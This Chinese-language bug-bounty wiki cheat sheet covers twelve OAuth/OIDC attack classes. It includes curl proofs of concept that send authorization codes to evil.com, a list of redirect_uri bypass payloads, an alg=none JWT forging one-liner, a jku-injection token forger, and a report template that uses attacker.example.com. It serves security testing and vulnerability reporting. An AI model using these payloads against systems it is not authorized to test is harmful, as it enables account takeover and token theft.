---
type: wiki
category: attack
tool: oauth,oidc
status: active
last-updated: 2026-04-21
---

# OAuth 2.0 / OIDC 攻擊鏈速查

> **用途：** OAuth / OIDC 是現代 SSO 的主流，錯誤實作直接 = ATO。本篇彙整 12 種攻擊類別 + curl PoC + severity 判定。
> 配合 bbflow hunters：`open-redirect`、`js-secrets`、`mcp-oauth-scope`、`jwt`。

## 先搞清楚 OAuth flow

```
1. Client 發 /authorize?response_type=code&client_id=X&redirect_uri=Y&state=S&scope=...
2. User login + consent
3. Authorization Server 回 302 → redirect_uri?code=AAA&state=S
4. Client /token 用 code + client_secret 換 access_token
5. Client 用 access_token 打 resource server
```

## 攻擊面 12 類

| # | 攻擊 | 前提 | 嚴重度 |
|---|------|------|-------|
| 1 | `redirect_uri` 任意 → code theft | 驗證鬆散 | P1 ATO |
| 2 | `redirect_uri` substring 驗證繞過 | 客端驗證 | P1 ATO |
| 3 | Open redirect on `redirect_uri` host | 另一個 CVE | P2 |
| 4 | Missing `state` → CSRF login | `state` 未驗證 | P3 |
| 5 | PKCE bypass（server 不驗 verifier） | 公開 client | P2 |
| 6 | Scope escalation（token 拿到 consent 未同意的 scope） | 後端 bug | P3-P2 |
| 7 | client_secret 硬編碼在 SPA | 公開 asset 可下載 | P2-P3 |
| 8 | Authorization code 可重用 | 後端不標 used | P2 |
| 9 | `response_type` 可切成 `token`（implicit） | 未限制 flow | P2 |
| 10 | JWT `alg=none` / weak HS256 | access_token 是 JWT | P1 |
| 11 | `jku`/`x5u` header injection | RS256 token | P1 |
| 12 | MCP OAuth scope mismatch（consent 未宣告的 write-level tool）| MCP server | P3 |

## 1. redirect_uri 任意驗證

### 檢測

```bash
# 原本的 authorize request
curl -sI "https://auth.target.com/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https://app.target.com/callback&state=xxx"

# 改成任意 domain
curl -sI "https://auth.target.com/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https://evil.com/steal&state=xxx"

# 看 Location：
# ✅ 回 error=invalid_redirect_uri → 安全
# 🔴 回 302 → https://evil.com/steal?code=... → ATO
```

### 手動 PoC

```bash
# 釣魚 URL（受害者點了會把 code 送到攻擊者）
echo "https://auth.target.com/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https://evil.com/steal&state=xxx&scope=openid+email"

# 攻擊者 server 收 code
curl 'https://evil.com/steal?code=AUTHCODE'

# 換 token（若 PKCE 關閉 or code_verifier 洩漏）
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTHCODE" \
  -d "client_id=abc" \
  -d "redirect_uri=https://evil.com/steal"
```

## 2. redirect_uri substring / prefix 驗證繞過

常見 bug：客端只驗 `startsWith('https://app.target.com')` 或 `includes('target.com')`。

```bash
# Prefix bypass（subdomain attack）
https://auth.target.com/authorize?redirect_uri=https://app.target.com.evil.com/callback

# Path traversal
https://auth.target.com/authorize?redirect_uri=https://app.target.com/../evil/callback

# Query string injection
https://auth.target.com/authorize?redirect_uri=https://evil.com/?app.target.com

# Hash fragment
https://auth.target.com/authorize?redirect_uri=https://evil.com/#@app.target.com/

# Unicode normalization
https://auth.target.com/authorize?redirect_uri=https://app.target.com%EF%BC%8Eevil.com/

# Userinfo
https://auth.target.com/authorize?redirect_uri=https://app.target.com@evil.com/

# Double URL encoding
redirect_uri=https%253A%252F%252Fevil.com
```

## 3. Open redirect on redirect_uri host

若 `https://app.target.com/callback?next=/home` 有 open redirect，OAuth code 會被轉送：

```
1. attacker 發：https://auth.target.com/authorize?redirect_uri=https://app.target.com/callback?next=https://evil.com
2. 受害者登入 → Authorization server 回 https://app.target.com/callback?code=AAA&next=https://evil.com
3. app.target.com 的 callback 處理完把 code 轉 next → code 給 evil.com
```

測試：

```bash
# 先找 callback 的 next/return_url
curl -I 'https://app.target.com/callback?next=https://evil.com'
# Location: https://evil.com → open redirect exists → chain
```

## 4. State CSRF

```bash
# 不帶 state
curl -sI "https://auth.target.com/authorize?response_type=code&client_id=abc&redirect_uri=https://app/callback"

# 帶假 state
curl -sI "https://auth.target.com/authorize?...&state=attacker_crafted"

# 把拿到的 code + 攻擊者 state 塞回受害者：
# https://app.target.com/callback?code=ATTACKER_CODE&state=attacker_crafted
# → 把攻擊者帳號 link 到受害者 session → 攻擊者能讀受害者後續操作
```

判斷：登入後把 attacker 送來的 code callback 填進 session → 帳號綁定攻擊（account link CSRF）。

## 5. PKCE bypass

公開 client（SPA、mobile app）**必須**用 PKCE。若後端不驗 `code_verifier`：

```bash
# 1. 受害者瀏覽器發 /authorize 帶 code_challenge=HASH1
#    https://auth/authorize?...&code_challenge=HASH1&code_challenge_method=S256

# 2. 攻擊者攔截 code（例：open redirect / XSS）

# 3. 攻擊者換 token 時用自己的 code_verifier
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "client_id=abc" \
  -d "redirect_uri=https://app/callback" \
  -d "code_verifier=ATTACKER_VERIFIER"

# 若回 access_token → PKCE 沒驗證（或 S256 broken） → P2-P1
```

## 6. Scope escalation

```bash
# 原本只同意 read:user
curl -X POST https://auth.target.com/oauth/authorize \
  -d "response_type=code" \
  -d "client_id=abc" \
  -d "scope=read:user admin:all" \    # 偷塞 admin scope
  -d "redirect_uri=..."

# 若 consent screen 不顯示 admin:all，但最後 token 回來有 → scope escalation
# 驗證：拿 token 試敏感 endpoint
curl https://api.target.com/admin/users -H "Authorization: Bearer $TOKEN"
```

MCP OAuth 版本（`mcp-oauth` hunter 會抓）：

```bash
# 從 discovery 看 scopes_supported
curl https://mcp.target.com/.well-known/oauth-authorization-server | jq .scopes_supported
# ['read', 'write', 'view_articles', 'create_articles', 'delete_articles']

# 實際 consent 只顯示 view_articles 的使用者 → token 卻可呼叫 create_articles
curl -X POST https://mcp.target.com/mcp \
  -H "Authorization: Bearer $MCP_TOKEN" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"create_article","arguments":{"title":"test"}}}'
# 若 HTTP 200 → scope mismatch P3
```

## 7. client_secret 硬編碼

SPA / mobile app 絕對不該有 client_secret（應該用 public client + PKCE）。但常見 misuse：

```bash
# bbflow
bbflow hunt target.com --only js-secrets

# 手動 grep
curl -s https://app.target.com/main.abc123.js | \
  grep -oE '"client_secret":"[A-Za-z0-9]{20,}"'

# 驗證 secret 有效
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=abc" \
  -d "client_secret=LEAKED_SECRET"
# 若回 access_token → confirmed P2-P3
```

## 8. Auth code reuse

```bash
# 第一次換 token（成功）
curl -X POST https://auth/token -d "code=XXX&..."
# {"access_token":"...","refresh_token":"..."}

# 第二次用同一個 code 換（應該失敗）
curl -X POST https://auth/token -d "code=XXX&..."
# ✅ 回 invalid_grant → 安全
# 🔴 再次回 access_token → code 可重用 P2
```

## 9. response_type 切成 token（implicit flow）

現代 OAuth 不該開 implicit flow。但若後端允許：

```bash
# 切 code → token（implicit）
https://auth.target.com/authorize?response_type=token&client_id=abc&redirect_uri=...

# 若 302 → https://app/callback#access_token=... → implicit flow 開啟
# implicit flow 本身就有 redirect_uri 必須完美驗證的問題
```

## 10. JWT access_token 攻擊

如果 access_token 是 JWT（OIDC 常見）：

```bash
# decode
TOKEN="eyJhbG..."
echo "$TOKEN" | cut -d. -f1 | base64 -d
echo "$TOKEN" | cut -d. -f2 | base64 -d

# alg=none
curl https://api.target.com/me \
  -H "Authorization: Bearer $(python3 -c '
import base64, json
h={"alg":"none","typ":"JWT"}
p={"sub":"1","role":"admin","exp":9999999999}
def b64(x): return base64.urlsafe_b64encode(json.dumps(x).encode()).decode().rstrip("=")
print(f"{b64(h)}.{b64(p)}.")
')"

# 若 HTTP 200 → P1 total auth bypass
```

進階：見 `wiki/24-tool-nuclei.md` § JWT + `wiki/41` JWT section。

## 11. jku/x5u injection

```bash
# 看 header
echo "$TOKEN" | cut -d. -f1 | base64 -d
# {"alg":"RS256","jku":"https://target.com/.well-known/jwks.json"}

# 改 jku 指向 attacker
PAYLOAD=$(python3 << 'EOF'
import base64, json, jwt
priv = open('attacker_rsa.pem').read()
h = {"alg":"RS256","jku":"https://evil.com/jwks.json","typ":"JWT"}
p = {"sub":"admin","exp":9999999999}
print(jwt.encode(p, priv, algorithm="RS256", headers=h))
EOF
)

# attacker 把自己的 public key 放 https://evil.com/jwks.json
# target 若 fetch jku 驗證 → 用 attacker key → 任何 token 通
curl https://api.target.com/admin -H "Authorization: Bearer $PAYLOAD"
```

## 12. MCP OAuth scope mismatch

見 §6 `mcp-oauth` hunter 已自動化。手動驗證：

```bash
# 1. 記錄 consent screen 文字（screenshot）
# 2. 抓 OAuth scopes_supported
# 3. 完成 flow 拿 token
# 4. 對 token 呼叫 tools/list
# 5. 比對：tool name 含 create/update/delete/write/execute 但 consent 沒提 → P3
```

## bbflow 整合

| 對應 hunter | 覆蓋攻擊 |
|------------|---------|
| `open-redirect` | §1 §2 §3（OAuth redirect_uri bypass 20 variant）|
| `js-secrets` | §7 client_secret hardcoded |
| `jwt` | §10 §11 JWT 攻擊 |
| `mcp-oauth` | §12 MCP OAuth scope mismatch |

```bash
bbflow hunt target.com --only open-redirect,js-secrets,jwt,mcp-oauth
```

## 報告 template

```markdown
## 漏洞概述
https://auth.target.com/oauth/authorize 存在 redirect_uri 任意驗證 → OAuth code theft → Account Takeover。

## 重現步驟

### Step 1: 確認 redirect_uri 不驗證
curl -sI "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=abc&\
redirect_uri=https://attacker.example.com/&\
state=xxx"
# HTTP/1.1 302 Found
# Location: https://auth.target.com/login?continue=...&redirect_uri=https://attacker.example.com/

### Step 2: 受害者登入後，code 送到 attacker
# (screenshot of browser 302 chain)

### Step 3: 換 access_token
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=abc&redirect_uri=https://attacker.example.com/"
# HTTP 200 {"access_token":"..."}

### Step 4: 拿 token 操作受害者帳號
curl https://api.target.com/user \
  -H "Authorization: Bearer $TOKEN"
# {"username":"victim","email":"victim@target.com"}

## Impact
- Account Takeover（任何受害者點釣魚連結即被接管）
- Verified via: curl HTTP 302 chain + `/user` endpoint returns victim data

## Severity
P1 (ATO)
```

## 關聯文件

- [14-waf-bypass-commands.md](14-waf-bypass-commands.md)
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) § Open redirect
- [24-tool-nuclei.md](24-tool-nuclei.md) § JWT
- [../hunters/hunt-open-redirect.sh](../hunters/hunt-open-redirect.sh)
- [../hunters/hunt-mcp-oauth-scope.sh](../hunters/hunt-mcp-oauth-scope.sh)
- RFC 6749 OAuth 2.0 / RFC 7636 PKCE / RFC 8414 Authorization Server Metadata
